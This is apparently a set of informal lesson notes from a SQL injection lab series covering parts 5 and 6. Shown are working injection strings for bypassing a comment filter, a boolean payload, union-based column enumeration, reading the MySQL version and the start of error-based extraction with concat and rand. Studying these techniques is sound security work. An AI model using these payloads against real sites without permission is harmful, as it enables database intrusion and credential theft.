# WIP LESSON 5 to

Part 5 from here

This time we're not allowed to use comments,consider there is a system which filters out the comments.

Consider our query looks like this

select id,username,password from table where id='1'.

So consider our input as 1' or '1

so it'll be,
select id,username,password from table where id='1' or '1'

So here '1' or '1' will be evaluated and 1 will be returned which will fetch all the username and password from the database but the website will only display the first row

When we give input as 1' and '1 the first page gets shown and when we give input as 2' and ' the second page gets shown because the AND operator works in sql, here it'll check if 2 is present in the table if it is it'll return true because the right side of AND is true.

lets try to enumerate the number of columns from this using order_by as earlier, but no matter what we give to order_by like order by(50) it wouldn't display any error because order by won't work without any comments(why?)

But we'll workaround this using union select 

we'll give something like 1' union select 1 AND '1, we'll get an error saying that the number of columns are different, we can use this get the number of columns in database.

1' union select 1,2,3 AND '1 -> No error , means there are 3 columns, now we have to break the right query as before so we'll inject something like this 50' union select 1,2,3 AND '1, Now we can enumerate a number of stuff like database names,version,current_user etc

50' union select 1,version(),3 AND '1

Part 6 from here

Unlike the previous levels in here we'll see that changing the id parameter, won't give us any valuable output the only thing we get is the error when mysql crashes so we somehow need to use the mysql error to our advantage.

So if we have a query like this select table_name,table_schema from information_schema.tables group by table_schema, Here we will get a table showing unique entries of table_schema(ie table names,basically what group by does).

From here on we'll be creating a bunch of sub queries.

select database();

select select(database());

select concat((select database()));

select concat(0x3a,0x3a,(select database()),0x3a,0x3a);

Here 0x3a denotes the value of colon(:) in hex.

select concat(0x3a,0x3a,(select database()),0x3a,0x3a) as a;

Adding in some randomness

select concat(0x3a,0x3a,(select database()),0x3a,0x3a,floor(rand()*2)) as a;
